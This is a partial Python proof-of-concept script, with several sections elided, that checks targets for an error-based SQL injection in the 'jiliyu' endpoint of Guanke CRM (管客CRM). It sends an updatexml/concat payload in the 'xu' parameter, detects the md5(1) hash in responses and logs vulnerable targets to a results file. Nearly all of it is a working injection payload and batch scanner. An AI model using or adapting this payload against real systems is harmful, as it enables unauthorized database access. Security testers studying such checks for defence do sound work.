...
def poc(target):
    payload="/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20md5(1)),0x7f),1)) "
    headres={
    ...
    try:
        ...
        if res1.status_code == 200:
            ...
            if 'c4ca4238a0b923820dcc509a6f75849' in res2.text:
                print(f"[+]{target}存在sql漏洞")
                with open('result1.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]该{target}不存在sql漏洞")
        else:
...
def main():
    #定义
    parser=argparse.ArgumentParser(description="管客CRM jiliyu接口存在SQL漏洞")
    # 添加命令行参数
